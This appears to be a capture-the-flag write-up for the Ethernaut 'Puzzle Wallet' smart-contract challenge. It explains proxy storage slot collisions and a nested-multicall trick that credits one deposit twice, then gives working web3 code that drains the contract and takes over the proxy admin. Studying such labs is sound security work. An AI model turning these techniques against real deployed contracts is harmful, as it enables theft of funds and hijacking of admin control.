## This challenge can be solved entirely on the ethernaut page
### General overview (goal: hijack proxy contract to become admin)
1. Note the storage slot collisions between proxy and puzzle contracts
2. Become admin for puzzle contract by calling proposeNewAdmin through puzzle contract which would alter slot 0 of contract storage
3. Once we are the admin, we can then whitelist ourself to call other functions 
4. Since admin address for the proxy contract is in slot 1 of storage, the aim would be to alter maxBalance (also slot 1 of storage) in puzzle contract to our address. But in order to do that, we'd have to call setMaxBalance which require the contract balance to be 0.
5. To get the puzzle contract balance to zero, we would need to be able to withdraw more than we put into the contract.
6. We can do that via the multicall function. But in this function, there is a check to make sure that we can only call deposit once per multicall. To bypass this check, we can then nest the deposit call into a multicall (i.e. using multicall to call 2 multicalls, each with a deposit call within). By doing this, we are able to send in the money only once, but update our balance with the contract more than once, which would then allow us to withdraw more than we put in.

### Code:
```
// becoming puzzle contract admin
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
params = [player]
data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
await web3.eth.sendTransaction({from: player, to: instance, data})

// whitelist ourselves
await contract.addToWhitelist(player)

// using multicall to send in funds once but get balance to be updated more than once (send in 0.001 but have balance be 0.002)
depositData = await contract.methods["deposit()"].request().then(v => v.data)
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
await contract.execute(player, toWei('0.002'), 0x0)

// set our address as admin using setMaxBalance
await contract.setMaxBalance(player)
```